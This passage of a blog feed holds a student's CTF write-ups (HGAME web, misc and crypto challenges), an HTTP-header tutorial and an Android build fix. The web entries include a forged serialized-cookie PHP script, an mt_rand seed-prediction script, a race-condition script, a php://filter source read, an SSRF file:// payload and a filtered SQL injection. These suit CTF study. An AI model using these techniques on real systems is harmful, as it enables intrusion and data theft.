punctuation">}</span></code></pre><blockquote><p>题目最终是要通过把rank的值变成1才能得到flag，通过cookie中的monster将自己构造的payload传入。</p><p>构造payload，把源码中涉及到加密的部分拿过来，然后自己创造Rank类把rank变量设为public从而能进行覆盖</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#payload</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Rank</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#private $key = </span><span class="token string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'%s'</span><span class="token punctuation">,</span> <span class="token string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sign</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$sign</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$monsterData</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'no'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Rank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookiedata</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cookiedata</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JiUsz9.png" alt="1"></p><h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><blockquote><p>看着那个妙蛙种子…二发…猜测和伪随机数有关</p><p>而且题目要求两秒提交答案，估计要写py脚本</p></blockquote><blockquote><p>最终查到一篇文章 <a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">https://www.ambionics.io/blog/php-mt-rand-prediction</a> ，然后发现github上有现成的工程，根据文章的算法以及github的工程写脚本（一开始还天真的想着把算法看看懂…后面…直接拿来用看看能不能跑出来</p><p>获取第一个和第226个随机数带入github的工程中，得出seed，再post过去得出flag</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reverse_mt_rand<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupurl <span class="token operator">=</span> <span class="token string">'https://twoshot.hgame.n3ko.co/random.php?times=228'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>start <span class="token operator">=</span> <span class="token number">0</span>end <span class="token operator">=</span> <span class="token number">227</span>response <span class="token operator">=</span> eval<span class="token punctuation">(</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>data <span class="token operator">=</span> reverse_mt_rand<span class="token punctuation">.</span>main_re<span class="token punctuation">(</span>int<span class="token punctuation">(</span>response<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>response<span class="token punctuation">[</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>url_post <span class="token operator">=</span> <span class="token string">'https://twoshot.hgame.n3ko.co/verify.php'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'ans'</span><span class="token punctuation">:</span> data<span class="token punctuation">}</span>rs <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_post<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/04/15/Jia1w6.png" alt="2"></p><h3 id="cosmos二手市场"><a href="#cosmos二手市场" class="headerlink" title="cosmos二手市场"></a>cosmos二手市场</h3><blockquote><p>试了小数负数都不太行，后面经过查询发现是考察条件竞争，利用服务器并发处理多线程没有加锁，同时处理多个请求的时间间隙。</p><p>于是写了脚本用多线程去同时买然后同时卖，中间手动调整商品买卖的数量…效率比较低 不过还是拿到flag</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> threading <span class="token keyword">import</span> Threadurl_buy <span class="token operator">=</span> <span class="token string">'http://121.36.88.65:9999/API/?method=buy'</span>url_solve <span class="token operator">=</span> <span class="token string">'http://121.36.88.65:9999/API/?method=solve'</span>header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=on8nad97el70fb6hd9idr4kboh'</span><span class="token punctuation">,</span>          <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'</span><span class="token punctuation">,</span>          <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'121.36.88.65:9999'</span><span class="token punctuation">,</span>          <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://121.36.88.65:9999/market.html'</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">attack</span><span class="token punctuation">(</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data        self<span class="token punctuation">.</span>method <span class="token operator">=</span> method    <span class="token keyword">def</span> <span class="token function">attack_buy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        k <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_buy<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>self<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">attack_solve</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_solve<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>self<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'buy'</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>attack_buy<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'solve'</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>attack_solve<span class="token punctuation">(</span><span class="token punctuation">)</span>data0 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'800001'</span><span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span><span class="token punctuation">}</span>data1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'800002'</span><span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span><span class="token punctuation">}</span>data2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'800003'</span><span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span><span class="token punctuation">}</span>data3 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'800004'</span><span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span><span class="token punctuation">}</span></code></pre><p><img src="https://s1.ax1x.com/2020/04/15/Jia57V.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame-week2</title>
      <link href="/2020/04/15/hgame-week2/"/>
      <url>/2020/04/15/hgame-week2/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="cosmos的博客后台"><a href="#cosmos的博客后台" class="headerlink" title="cosmos的博客后台"></a>cosmos的博客后台</h3><a id="more"></a><blockquote><p>查看网页源代码没有什么收获，尝试伪协议读源码，构造 <a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</a> ，发现base64编码后的源代码，同理获得index.php和admin.php的源代码。</p></blockquote><blockquote><p>本来想直接读取config.php但是在index.php里被filter了，无法直接读取用户名和密码的具体值，于是继续进行代码审计。</p><p>发现debug参数传入变量名会显示变量值，在login.php里得知用户名和密码的变量为admin_username和admin_password，借助debug获取变量值。</p></blockquote><pre><code>//login.php&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;用户名或密码错误&quot;;        }    }}?&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JiJIu6.png" alt="23"></p><blockquote><p>其中密码要求MD5后和原来密码相同，这里涉及到php里md5的绕过和==的弱比较，因为密码是0e开头，在和另一个字符串比较的时间会变成零，所以找一个MD5后也是0e开头的传入即可。</p></blockquote><pre><code>//admin.php&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;</code></pre><blockquote><p>登录成功之后，代码审计admin.php，没有对imagl_url进行任何限制和处理，属于ssrf攻击，尝试了不同的协议dict，file，gopher；后来发现自己想复杂了，payload构造img_url=file://localhost/flag就可以了…</p><p>网页源代码里把图片的base64值解密得出flag</p></blockquote><h3 id="cosmos的留言板"><a href="#cosmos的留言板" class="headerlink" title="cosmos的留言板"></a>cosmos的留言板</h3><blockquote><p>首先根据题目描述，感觉应该是sql注入。</p><p>尝试id=1’ union select database() #发现空格和小写select还有#被过滤，采用大写SELECT和%0a，%23，绕过</p><p>先用order by确认返回字段的数量，发现只有1，然后确认返回位置；接下来就一步一步注入获取表名和字段名。</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JiJTHO.png" alt="k"></p><p><img src="https://s1.ax1x.com/2020/04/15/JiYCVS.png" alt="i"></p><p><img src="https://s1.ax1x.com/2020/04/15/JiYPUg.png" alt="rs"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="cosmos的午餐"><a href="#cosmos的午餐" class="headerlink" title="cosmos的午餐"></a>cosmos的午餐</h3><blockquote><p>打开发现pcapng文件和一个log文件，目测是流量审计的题目，通过查找资料后发现log文件是用来解密tsl，解密后，在导出对象http里看看有没有压缩包之类的，发现有x-www-form-urlencoded（主要和里面其他文件类型不同，所以点开看看），发现pk开头是压缩包！</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JiYi5Q.png" alt="1580442556802"></p><blockquote><p>压缩包下载后解压发现是一张图片，名字outguess with key，提示要用outguess，key根据题目描述在图片备注里，打开虚拟机ubuntu</p><p>outguess -kk “gUNrbbdR9XhRBDGpzz” -r “kkk.jpg” iiit.txt</p><p>得到文件 打开后显示<a href="https://dwz.cn/69rOREdu" target="_blank" rel="noopener">https://dwz.cn/69rOREdu</a></p><p>进入后下载了一个压缩包，打开一个二维码，扫描得到flag</p></blockquote><h3 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h3><blockquote><p>根据题目描述还有压缩包名字fake，怎么看都感觉像伪加密…. 尝试直接打开发现要密码，用7zip直接打开伪加密文件；另外压缩包给了提示F5 key: NllD7CQon6dBsFLr</p><p>继续用f5对图片进行解密，得出一大串hex码</p><p>放入hex解码后得出flag</p></blockquote><h3 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h3><blockquote><p>解压后一个pdf一个压缩包，由于最近一直在做各种隐写，首先先去查查pdf隐写，发现wbs43open这个工具，联系到pdf文件名no password解密无需密码，直接用这个工具解密，得到Zip Password: OmR#O12#b3b%s*IW，打开发现是word文档，在压缩包里右键查看文件直接进入隐藏的zip，发现是一些xml文件；查询后得知flag一般放在word文件下的document里，进入word文件夹后发现secret.xml，在里面获得flag</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame_week1</title>
      <link href="/2020/01/25/hgame-week1/"/>
      <url>/2020/01/25/hgame-week1/</url>
      
        <content type="html"><![CDATA[<p>学校的新生赛ctf，自己做了下wp</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h2 id="cosmos的博客"><a href="#cosmos的博客" class="headerlink" title="cosmos的博客"></a>cosmos的博客</h2><blockquote><p>这是一个文件泄露的题目，出题人暗示用了git，用了git以后会生成一个.git文件，在这个文件夹中的config文件里存放了github的url地址</p></blockquote><img src="https://s1.ax1x.com/2020/04/15/JPXA1S.png" alt="1579670922512" style="zoom: 80%;"><blockquote><p>根据url找到github上的仓库，在init区域找到base64编码后的flag文件，解码后即可得到flag</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXwh6.png" alt="1579671239035"></p><h2 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h2><blockquote><p>这是一道考察http头部的题目，根据要求，构造http请求头部,并且试用post请求</p><p>使用hackbar构造</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXrcD.png" alt="1579671785694"></p><h2 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h2><blockquote><p>一进去是显示403，查看源代码后发现是302跳转的问题，直接访问index.php也访问不了。网上查询了一下之后，尝试了一下post请求访问index，意外访问成功…</p><p>进入index之后显示是要通过url传参，解决一下url编码问题，构造a=3%2b7</p></blockquote><h2 id="cxk打篮球"><a href="#cxk打篮球" class="headerlink" title="cxk打篮球"></a>cxk打篮球</h2><blockquote><p>查看了下网页源代码，感觉像是和前端漏洞有关，后面用bp抓包，发现直接改分数，然后send过去，flag就出来了…虽然出题人本意好像不是如此（滑稽</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXcBd.png" alt="1579672873544"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="欢迎参加hgame"><a href="#欢迎参加hgame" class="headerlink" title="欢迎参加hgame"></a>欢迎参加hgame</h2><blockquote><p>签到题，题目给了一串编码，base64解码后发现是摩斯密码，对照表即可得出flag</p></blockquote><h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><blockquote><p>题目下载解压后是一张图片，notepade++打开后，发现有地方写着flag.txt，于是怀疑藏了压缩包，把后缀名改成zip后成功打开，密码是图片的p站id，在网上找了个上传p站图片显示id的网站成功拿到密码，打开压缩包里的flag.txt，发现是/u开头的编码，但是后面只有两位16进制数，在百度上找到Unicode字符列表，一一对应得出flag</p></blockquote><h2 id="克鲁苏神话"><a href="#克鲁苏神话" class="headerlink" title="克鲁苏神话"></a>克鲁苏神话</h2><blockquote><p>一开始看hint要用到7zip以为是伪加密，用winhex打开发现并不是，然后查了下压缩包在ctf中的加密，发现一种明文攻击方式。外面和压缩包里都有bacon.txt，而且crc32值也一样，采用的是同一种加密方法，7zip是用在给外面的bacon.txt文件压缩，因为明文攻击需要采用同一种压缩方式，之后用工具archpr明文攻击，得到解压缩后的文件。</p><p>文件里一个word一个bacon.txt，word打开需要密码，于是自然想到密码藏在bacon.txt里。一开始没有注意到文件名是培根的意思，思索了很久，后来发现是培根密码，大写字母为b小写字母为a，解密后得出word密码。打开word后没有看到flag，百度了下word在ctf中的隐写，把显示中设置为隐藏文字，flag就出现了</p></blockquote><h2 id="签到题proplus"><a href="#签到题proplus" class="headerlink" title="签到题proplus"></a>签到题proplus</h2><blockquote><p>这题考的是各种编码还有栅栏与凯撒加密</p><p>根据password.txt里的提示，是先进行分为3组的栅栏加密再进行左移5位的凯撒加密，因为一开始不知道网上有现成的解密网站，自己用py写了个凯撒解密… 栅栏再操作下，跑出英文句子与密码</p></blockquote><pre><code>def kaisa(str):        word = &#39;&#39;        if str.isalpha():                    if str.isupper():                        word = chr((ord(str) - 65 - 5 + 26) % 26 + 65)                else:                        word = chr((ord(str) - 97 - 5 + 26) % 26 + 97)        else:                word = str            return worddef main():    with open(&#39;Password.txt&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:        str_line = f.readline()        first = str_line[0:50]        sec = str_line[51:101]        thir = str_line[102:152]        word = []        for i in range(0, 50):            one = kaisa(first[i])            two = kaisa(sec[i])            three = kaisa(thir[i])            word.append(one + two + three)            print(word[i], end=&quot;&quot;)    print()    psd = &#39;EMAQETAUQMPVBHVD&#39;    f = &#39;EMAQET&#39;    s = &#39;AUQMP&#39;    t = &#39;VBHVD&#39;    rs = &#39;&#39;    for i in range(5):        rs += f[i] + s[i] + t[i]    rs += &#39;T&#39;    print(rs)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JPX538.png" alt="1579679219840"></p><blockquote><p>解压后打开OK.txt，发现是ook编码，直接用在线工具解密，解密后得出base32编码；再用工具解密base32，解密得出看到最后两个等号，感觉是base64，直接解密发现不行出现乱码，但是最上面显示png三个字母，于是感觉应该是解密出一张图片；最终找到一个base64转图片的网站，解密出一个二维码，扫码得出flag</p></blockquote><h2 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h2><blockquote><p>题目下载解压后是一个pcapng文件，查询后得知用wireshark打开，发现是一大堆流量包；考虑到http中用post传送比较重要的文件，于是就过滤一下看看有没有压缩包之类的，然后就发现可疑的地方</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXbHs.png" alt="1579680353132"></p><blockquote><p>追踪http流后发现这个php文件里可能藏了一个zip，就在导出对象：http中导出了这个文件。</p><p>一开始我直接把文件后缀改成zip，也能正常打开，提示密码六位数字，直接选择密码爆破；但是用工具爆破密码时却说这个不是zip文件，然后我用winhex打开发现开头不是50 4B 03 04，而是在后面一点；就用notepade++打开，把上面的部分和最后面不属于zip文件的部分给删掉，然后再用工具爆破就成功了。</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXX40.png" alt="1579680869618"></p><blockquote><p>解压缩之后是一个mp3文件，百度了一下音频隐写，用audacity打开音频，换成频谱图之后，就出现了flag</p></blockquote><p><img src="https://s1.ax1x.com/2020/04/15/JPXzgU.png" alt="1579681081249"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h2 id="infantRSA"><a href="#infantRSA" class="headerlink" title="infantRSA"></a>infantRSA</h2><blockquote><p>根据题目名字的提示，百度RSA加密，然后观察题目py的加密脚本，根据RSA写出解密脚本</p></blockquote><pre><code>def main():        num = 275698465082361070145173688411496311542172902608559859019841        p = 681782737450022065655472455411        q = 675274897132088253519831953441        e = 13        k = (p - 1) * (q - 1)        i = 1        while (k * i + 1) % e != 0:                i += 1        rs = (k * i + 1) // 13       rs = pow(num, rs, p*q)        print(rs)        b = int.to_bytes(rs, 25, byteorder=&#39;big&#39;)        print(b.decode())if __name__ == &#39;__main__&#39;:        main()</code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JPj9u4.png" alt="1579681630951"></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><blockquote><p>看懂py的加密方式后，写出对应的解密脚本</p><p>另外关于A，B两个数，因为flag前面几位是hgame开头，我是根据这个联立方程求出A，B的值…</p></blockquote><pre><code>TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;def co(num):        i = 0        rs = TABLE.find(num) + 62 * i - 14        while rs % 13 != 0:                i += 1                rs = TABLE.find(num) + 62 * i - 14        rs = rs // 13        return rsdef maim():        MOD = len(TABLE)        flag = &#39;A8I5z{xr1A_J7ha_vG_TpH410}&#39;        print(MOD)        rs = &#39;&#39;        for i in flag:                if i not in TABLE:                        rs += i                else:                        num = co(i)                        rs += TABLE[num]                print(rs)if __name__ == &#39;__main__&#39;:        maim()</code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JPjVC6.png" alt="1579681922159"></p><h2 id="reorder"><a href="#reorder" class="headerlink" title="reorder"></a>reorder</h2><blockquote><p>根据nc 47.98.192.231 25002 ，尝试了下发下是对输入进行重新排序，直接回车会出现乱序flag；并且重新打开后，重新排序方式是不一样的；关键在于，乱序方式和之前对输入的重新排序一样，于是只要输入和flag相同长度的一串字符串，观察排序方式即可排序出正常 的flag。写了个脚本帮忙排序如下</p></blockquote><pre><code>def main():    str_1 = &#39;1234567890qwertyuiopasdfghjklzxc&#39; # 输入flag等长字符串    rs_1 = &#39;9y642ter80531wq7gcspixlzfhaoukjd&#39;  # 输出    str_rs = &#39;$L{mgpImUteah5+jA}me_!n!TTRP30iu&#39; # 乱序flag    rs = [0]*32    for i in range(len(str_1)):        num = rs_1.find(str_1[i])        rs[i] = str_rs[num]    for i in rs:        print(i, end=&#39;&#39;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://s1.ax1x.com/2020/04/15/JPjmvD.png" alt="1579683110283"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http-ctf</title>
      <link href="/2019/11/20/http-ctf/"/>
      <url>/2019/11/20/http-ctf/</url>
      
        <content type="html"><![CDATA[<p>在做bugku的web基础题时，对http的内容做了下整理。</p><a id="more"></a><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><img src="https://s1.ax1x.com/2020/04/15/JPvNJx.png" alt="avatar" style="zoom:80%;"><blockquote><p>域名解析，把 flag.baidu.com解析到123.206.87.240。123.206.87.240是ip地址，flag.baidu.com是域名，看起来就像是平常正常访问的网页的名字。</p></blockquote><blockquote><p>在实际生活中，一个ip可以对应多个域名，不同网页共享一个ip。</p></blockquote><blockquote><p>然后问题就来了，ip相同，http如何区分到底是去哪个域名下的内容？</p><p>这里用到http头部的host字段，在host中加上要访问的域名的名称，对方就知道你想访问的是这个ip下的哪个域名</p></blockquote><blockquote><p>构造:</p><p>host：flag.baidu.com</p></blockquote><img src="https://s1.ax1x.com/2020/04/15/JPv0yD.png" alt="avatar" style="zoom: 80%;"><blockquote><p>flag就出来了</p></blockquote><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><img src="https://s1.ax1x.com/2020/04/15/JPvBOe.png" alt="avatar" style="zoom:80%;"><blockquote><p>点进去后看到提示， are you from google? </p><p>你是从谷歌来的吗？</p></blockquote><blockquote><p>在http中有一个字段叫做referer,他携带的内容是该http请求的来源地址，通俗来说就是从哪个链接访问的，该字段经常用于防盗链和防csrf（跨站请求伪造）</p></blockquote><blockquote><p>了解到了这一步，接下来就是构造http头</p><p>referer：<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p></blockquote><img src="https://s1.ax1x.com/2020/04/15/JPvswd.png" alt="avatar" style="zoom:80%;"><blockquote><p>可以看到，在referer头部加上谷歌的网址，假装你是从谷歌访问的这个网站，flag就出来了。</p></blockquote><h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><img src="https://s1.ax1x.com/2020/04/15/JPvOpV.png" alt="avatar" style="zoom:80%;"><blockquote><p>点进去网页提示请从本地访问，另外网址中包含localhost, 也是在暗示，localhost是域名，表示的是本地，也就是127.0.0.1本地ip指向的域名。</p></blockquote><blockquote><p>这里要用到的是http协议中的X-Forwarded-For（简称XFF头），他代表请求端的真实ip地址。</p></blockquote><blockquote><p>他的标准格式是 X-Forwarded-For: client1, proxy1, proxy2，…</p></blockquote><blockquote><p>从标准格式可以看出，XFF头信息可以有多个，中间用逗号分隔，其中第一项为真实的客户端ip，后面的则是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个，如果没有就没有。</p></blockquote><blockquote><p>这道题只需要表示从本地访问，所以只需要构造 X-Forwarded-For: 127.0.0.1就好了，这里不能填localhost因为loaclhost是域名，他对应的ip地址是127.0.0.1，而XFF头携带的是ip地址。</p></blockquote><img src="https://s1.ax1x.com/2020/04/15/JPx8c8.png" alt="avatar" style="zoom:80%;">]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用glide时遇到的问题</title>
      <link href="/2019/11/15/%E5%AE%89%E5%8D%93/"/>
      <url>/2019/11/15/%E5%AE%89%E5%8D%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天在做android开发时遇到了点问题，在添加依赖时，用到了</p></blockquote><pre><code>implementation &#39;com.github.bumptech.glide:glide:4.10.0&#39;</code></pre><blockquote><p>结果在build的时候疯狂报错，找到error</p></blockquote><pre><code>Failed to resolve: com.github.bumptech.glide:</code></pre><a id="more"></a><blockquote><p>这个错误的意思就是没能成功从github上下载这个依赖</p><p>解决方式，在build.gradle中添加阿里云的镜像库，这样在查找依赖时就会从国内镜像库中查找。</p></blockquote><pre><code>maven{ url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39;}</code></pre><pre><code>buildscript {repositories {   maven{ url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39;}   google()   jcenter()}}allprojects {repositories {   maven{ url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39;}   google()   jcenter()}}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> 移动端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-多态与静态之间的关系</title>
